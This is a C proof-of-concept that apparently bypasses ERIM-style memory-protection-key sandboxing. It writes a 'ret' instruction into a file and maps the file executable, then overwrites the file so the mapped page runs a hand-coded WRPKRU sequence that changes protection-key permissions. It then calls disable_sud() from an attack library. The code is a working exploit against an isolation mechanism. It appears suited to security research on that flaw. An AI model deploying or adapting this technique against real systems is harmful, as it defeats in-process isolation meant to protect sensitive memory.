#define _LARGEFILE64_SOURCE /* See feature_test_macros(7) */
#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <fcntl.h>

#include <sys/mman.h>

#include "_libattack.h"


int main(int argc, char **argv) {
    unlink("/tmp/erim_bypass");

    int fdrw = open("/tmp/erim_bypass", O_CREAT|O_RDWR, 0700);

    unsigned char buf1[4096] = {
        0xc3, // ret
        0
    };

    ssize_t write_r = write(fdrw, buf1, sizeof(buf1));
    printf("write 1: %lld\n", (long long int)write_r);
    close(fdrw);

    int fdro = open("/tmp/erim_bypass", O_RDONLY);
    if (fdro < 0) {
        perror("fdro open");
        exit(1);
    }
    void *addr = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_EXEC, MAP_PRIVATE, fdro, 0);
    close(fdro);

    printf("mapped file at %p\n", addr);

    void (*fun_ptr)(void) = (void(*)(void))addr;
    fun_ptr();

    fprintf(stderr, "successfully executed mapped page\n");

    unsigned char buf2[4096] = {
        0x50, 0x52, 0x51, // push rax, rdx, rcx
        0x31, 0xc9,  // xor ecx, ecx
        0x31, 0xd2,  // xor edx, edx
        0xb8, 0x0, 0x0, 0x0, 0x0, // mov eax,0x55555550
        0x0f, 0x01, 0xef, // wrpku
        0x59, 0x5a, 0x58, // pop rcx, rdx, rax
        0xc3, // ret
        0
    };


    fdrw = open("/tmp/erim_bypass", O_RDWR);
    write_r = write(fdrw, buf2, sizeof(buf2));
    close(fdrw);
    printf("write 2: %lld\n", (long long int)write_r);

    fun_ptr();

    disable_sud();
    sud_test();
    return 0;
}